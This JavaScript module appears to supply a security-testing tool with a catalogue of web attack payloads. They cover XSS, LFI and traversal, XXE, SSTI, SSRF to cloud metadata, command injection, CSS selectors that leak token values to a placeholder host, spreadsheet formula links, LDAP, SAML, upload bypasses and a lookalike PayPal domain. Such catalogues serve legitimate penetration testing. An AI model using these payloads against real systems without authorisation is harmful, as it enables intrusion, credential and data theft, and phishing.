// Curated from the local PayloadsAllTheThings reference folders. Entries are text only.
const entries = [];

function add(category, section, rows, target) {
  for (const [label, template] of rows) {
    entries.push({id: `curated-${entries.length + 1}`, category, section, label, template, ...(target ? {target} : {})});
  }
}

add('XSS', 'Additional contexts', [
  ['HTML entity angle brackets', '&#60;svg onload=alert(1)&#62;'],
  ['SVG image href', '<svg><image href=x onerror=alert(1) /></svg>'],
  ['HTML5 autofocus', '<input autofocus onfocus=alert(1)>'],
  ['Hidden input access key', '<input type=hidden accesskey=x onclick=alert(1)>'],
  ['Inline JavaScript string', "';alert(1);//"],
  ['Template literal expression', '${alert(1)}'],
  ['SVG file test', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'],
  ['XML stylesheet check', '<?xml-stylesheet href="javascript:alert(1)"?>']
]);
add('LFI', 'Additional paths and wrappers', [
  ['Triple encoded traversal', '%25252e%25252e%25252f{{relative_file}}'],
  ['Nested slash traversal', '....//....//{{relative_file}}'],
  ['Absolute configured file', '{{file}}'],
  ['PHP UTF-8 filter', 'php://filter/convert.iconv.UTF-8.UTF-16/resource={{file}}'],
  ['PHP zlib filter', 'php://filter/zlib.deflate/resource={{file}}'],
  ['Linux process environ', '/proc/self/environ'],
  ['Windows path with backslashes', '..\\..\\..\\Windows\\win.ini']
]);
add('XXE', 'Additional entity contexts', [
  ['External HTTP entity', '<!DOCTYPE probe [<!ENTITY xxe SYSTEM "http://{{host}}:{{port}}/probe">]><probe>&xxe;</probe>'],
  ['External file entity', '<!DOCTYPE probe [<!ENTITY xxe SYSTEM "file://{{file}}">]><probe>&xxe;</probe>'],
  ['Parameter entity', '<!DOCTYPE probe [<!ENTITY % ext SYSTEM "http://{{host}}:{{port}}/probe.dtd"> %ext;]><probe/>'],
  ['SOAP entity probe', '<?xml version="1.0"?><!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "file://{{file}}">]><Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body>&xxe;</Body></Envelope>'],
  ['SVG entity probe', '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{{file}}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'],
  ['XInclude text', '<probe xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://{{file}}" parse="text"/></probe>']
]);
add('SSTI', 'Additional engine checks', [
  ['Jinja multiplication fingerprint', "{{7*'7'}}"],
  ['Django add filter', '{{7|add:42}}'],
  ['FreeMarker alternative syntax', '[=7*7]'],
  ['Thymeleaf preprocessing', '__${7*7}__'],
  ['Razor expression', '@(7*7)'],
  ['EEx expression', '<%= 7 * 7 %>']
]);
add('SSRF', 'Additional target forms', [
  ['IPv6-mapped loopback', 'http://[::ffff:127.0.0.1]/'],
  ['Decimal loopback', 'http://2130706433/'],
  ['AWS IMDSv2 token URL', 'http://169.254.169.254/latest/api/token'],
  ['GCP metadata URL', 'http://metadata.google.internal/computeMetadata/v1/'],
  ['Azure metadata URL', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
  ['File scheme with configured path', 'file://{{file}}']
]);

add('CORS', 'Origin variants', [
  ['Null origin', 'Origin: null'],
  ['Configured HTTPS origin', 'Origin: https://{{host}}'],
  ['Configured HTTP origin', 'Origin: http://{{host}}'],
  ['Lookalike subdomain', 'Origin: https://{{host}}.example.com'],
  ['Different port', 'Origin: https://{{host}}:{{port}}'],
  ['Localhost origin', 'Origin: http://localhost:{{port}}']
], 'headers');
add('CORS', 'Preflight headers', [
  ['Requested PUT method', 'Access-Control-Request-Method: PUT'],
  ['Requested DELETE method', 'Access-Control-Request-Method: DELETE'],
  ['Requested authorization header', 'Access-Control-Request-Headers: authorization'],
  ['Requested custom header', 'Access-Control-Request-Headers: x-test-header']
], 'headers');

add('CMD', 'Unix separators and substitution', [
  ['Semicolon identity check', ';id'], ['AND identity check', '&&id'],
  ['Pipe identity check', '|id'], ['Command substitution', '$(id)'],
  ['Backtick substitution', '`id`'], ['Newline separator', '%0aid'],
  ['OR identity check', '||id']
]);
add('CMD', 'Delay and whitespace', [
  ['Semicolon delay', ';sleep {{seconds}}'],
  ['AND delay', '&&sleep {{seconds}}'],
  ['IFS separator', 'cat${IFS}{{file}}'],
  ['Brace expansion', '{id,}'],
  ['Single-quote splitting', "w'h'oami"],
  ['Double-quote splitting', 'w"h"oami']
]);
add('CMD', 'Windows checks', [
  ['Windows AND check', '&whoami'],
  ['Windows pipe check', '|whoami'],
  ['Windows conditional check', '&&whoami'],
  ['Windows delay', '&timeout /T {{seconds}}']
]);

add('CRLF', 'Newline encodings', [
  ['CRLF', '%0d%0a'], ['LF', '%0a'], ['Double-encoded CRLF', '%250d%250a'],
  ['Literal CRLF', '\r\n'], ['Unicode line separator', '%E2%80%A8']
]);
add('CRLF', 'Header probes', [
  ['Injected marker header', '%0d%0aX-Hack-DevTools: probe'],
  ['Injected Location header', '%0d%0aLocation:%20https://{{host}}/'],
  ['Injected cookie header', '%0d%0aSet-Cookie:%20hack-devtools=probe'],
  ['Double-encoded marker', '%250d%250aX-Hack-DevTools:%20probe']
]);

add('CSS', 'Imports and style markers', [
  ['Remote stylesheet', '@import url(https://{{host}}/probe.css);'],
  ['Background URL', 'body{background-image:url(https://{{host}}/probe)}'],
  ['Visible outline', '*{outline:2px solid red!important}'],
  ['Inline style marker', 'color:red;background:yellow']
]);
add('CSS', 'Attribute selectors', [
  ['Input value prefix', 'input[value^="a"]{background:url(https://{{host}}/a)}'],
  ['Named input value prefix', 'input[name="token"][value^="a"]{background:url(https://{{host}}/a)}'],
  ['Attribute exact match', 'input[value="{{value}}"]{outline:2px solid red}']
]);

add('CSV', 'Formula probes', [
  ['Arithmetic formula', '=1+1'], ['Leading plus formula', '+1+1'],
  ['SUM formula', '@SUM(1,1)'], ['Leading tab formula', '\t=1+1'],
  ['Leading carriage return formula', '\r=1+1']
]);
add('CSV', 'URL formulas', [
  ['Spreadsheet hyperlink', '=HYPERLINK("https://{{host}}/csv","probe")'],
  ['IMPORTXML probe', '=IMPORTXML("https://{{host}}/csv","//a")']
]);

add('Encoding', 'Unicode compatibility forms', [
  ['Fullwidth o ｏ (U+FF4F, NFKC → o)', 'ｏ'],
  ['Superscript o ᵒ (U+1D52, NFKC → o)', 'ᵒ'],
  ['Masculine ordinal º (U+00BA, NFKC → o)', 'º'],
  ['Fullwidth apostrophe ＇ (U+FF07)', '＇'],
  ['Fullwidth quote ＂ (U+FF02)', '＂'],
  ['Fullwidth slash ／ (U+FF0F)', '／'],
  ['Two dot leader ‥ (U+2025, NFKC → ..)', '‥'],
  ['Fullwidth ampersand ＆ (U+FF06)', '＆'],
  ['Small curly braces ﹛﹜ (U+FE5B/FE5C)', '﹛﹜']
]);
add('Encoding', 'Visual lookalikes', [
  ['Greek omicron ο (U+03BF)', 'ο'],
  ['Cyrillic o о (U+043E)', 'о'],
  ['Armenian o օ (U+0585)', 'օ'],
  ['Coptic o ⲟ (U+2C9F)', 'ⲟ'],
  ['Cyrillic a а (U+0430)', 'а'],
  ['Cyrillic e е (U+0435)', 'е'],
  ['Cyrillic p р (U+0440)', 'р'],
  ['Cyrillic c с (U+0441)', 'с']
]);
add('Encoding', 'Normalization examples', [
  ['Fullwidth quote in SQL probe', '＇ OR ＇1＇=＇1'],
  ['Fullwidth slash URL', '／／{{host}}／'],
  ['Compatibility traversal', '‥/‥/‥/{{relative_file}}'],
  ['Compatibility braces', '﹛﹛7*7﹜﹜'],
  ['Punycode lookalike domain', 'раypal.com']
]);

add('GraphQL', 'Introspection and errors', [
  ['Typename', '{ __typename }'],
  ['Schema type names', '{ __schema { types { name } } }'],
  ['Query type', '{ __schema { queryType { name } } }'],
  ['Schema directives', '{ __schema { directives { name } } }'],
  ['User type fields', '{ __type(name:"User") { fields { name } } }'],
  ['Invalid field suggestion', '{ thisdefinitelydoesnotexist }'],
  ['Aliased typename fields', '{ first: __typename second: __typename }']
]);
add('GraphQL', 'JSON request bodies', [
  ['Typename JSON request', '{"query":"{ __typename }"}'],
  ['Schema JSON request', '{"query":"{ __schema { types { name } } }"}'],
  ['Variables JSON request', '{"query":"query User($id: ID!) { user(id: $id) { id } }","variables":{"id":"1"}}'],
  ['Batch JSON array', '[{"query":"{ __typename }"},{"query":"{ __schema { queryType { name } } }"}]']
]);

add('HPP', 'Duplicate parameters', [
  ['Same key, two values', 'id=1&id=2'],
  ['Privilege flag duplicated', 'admin=false&admin=true'],
  ['Array syntax', 'id[]=1&id[]=2'],
  ['Nested parameter', 'id[value]=1&id[role]=admin'],
  ['Encoded ampersand value', 'id=1%26admin=true'],
  ['Duplicate JSON keys, keep raw', '{"role":"user","role":"admin"}']
]);
add('HPP', 'Full URL variants', [
  ['Duplicate ID in target URL', '{{origin}}{{path}}?id=1&id=2'],
  ['Duplicate role in target URL', '{{origin}}{{path}}?role=user&role=admin']
], 'url');

add('LDAP', 'Filter probes', [
  ['Wildcard match', '*'],
  ['Object class match', '*)(objectClass=*'],
  ['UID filter break', '*)(uid=*))(|(uid=*'],
  ['Always true filter', ')(|(uid=*))'],
  ['Always false filter', ')(!(&(uid=*)))'],
  ['Mail attribute exists', '*)(mail=*'],
  ['Password prefix probe', '*)(userPassword=a*']
]);

add('SAML', 'Assertion structure', [
  ['NameID element', '<saml:NameID>probe@example.com</saml:NameID>'],
  ['NameID comment split', '<saml:NameID>admin<!-- -->@example.com</saml:NameID>'],
  ['Duplicate NameID probe', '<saml:NameID>user@example.com</saml:NameID><saml:NameID>admin@example.com</saml:NameID>'],
  ['Unsigned assertion skeleton', '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Subject><saml:NameID>probe@example.com</saml:NameID></saml:Subject></saml:Assertion>'],
  ['Response with duplicate assertions', '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion ID="first"><saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject></saml:Assertion><saml:Assertion ID="second"><saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>'],
  ['Signature reference skeleton', '<ds:Reference xmlns:ds="http://www.w3.org/2000/09/xmldsig#" URI="#assertion-id"/>'],
  ['Audience restriction', '<saml:AudienceRestriction xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Audience>https://{{host}}/</saml:Audience></saml:AudienceRestriction>']
]);

add('Upload', 'Filename variants', [
  ['Double extension', 'file.php.jpg'], ['Reverse double extension', 'file.jpg.php'],
  ['Mixed-case PHP', 'file.pHp'], ['Legacy null suffix', 'file.php%00.jpg'],
  ['Encoded newline suffix', 'file.php%0a'], ['ASP alternate data stream', 'file.asp::$DATA'],
  ['SVG filename', 'probe.svg'], ['HTML filename', 'probe.html']
]);
add('Upload', 'Content-Type headers', [
  ['SVG media type', 'Content-Type: image/svg+xml'],
  ['HTML media type', 'Content-Type: text/html'],
  ['Octet stream media type', 'Content-Type: application/octet-stream'],
  ['JPEG media type', 'Content-Type: image/jpeg']
], 'headers');
add('Upload', 'Text file contents', [
  ['SVG marker', '<svg xmlns="http://www.w3.org/2000/svg"><text>Hack-DevTools</text></svg>'],
  ['HTML marker', '<!doctype html><title>Hack-DevTools upload</title><p>Upload probe</p>'],
  ['Apache handler directive', 'AddType application/x-httpd-php .jpg']
]);

add('WebSocket', 'Message examples', [
  ['JSON ping', '{"type":"ping"}'],
  ['JSON subscription', '{"type":"subscribe","channel":"{{value}}"}'],
  ['Socket.IO connect', '40'],
  ['Socket.IO event', '42["message",{"text":"probe"}]'],
  ['GraphQL connection init', '{"type":"connection_init","payload":{}}'],
  ['GraphQL subscribe', '{"id":"1","type":"subscribe","payload":{"query":"subscription { __typename }"}}']
]);
add('WebSocket', 'Handshake header examples', [
  ['Origin override', 'Origin: https://{{host}}'],
  ['WebSocket protocol', 'Sec-WebSocket-Protocol: graphql-transport-ws']
], 'headers');

add('XPath', 'Boolean probes', [
  ['Quote boolean', "' or '1'='1"],
  ['Quote false', "' and '1'='2"],
  ['Numeric boolean', '1 or 1=1'],
  ['Count root nodes', 'count(/*)'],
  ['Match any node', '//*'],
  ['First user node', '//user[1]']
]);
add('XPath', 'Blind checks', [
  ['Username first character', "substring(//user[1]/username,1,1)='a'"],
  ['Username length', 'string-length(//user[1]/username)=5'],
  ['Contains marker', "contains(//user[1]/username,'a')"],
  ['Root element name', 'name(/*)']
]);

export const CURATED_PAYLOADS = entries;
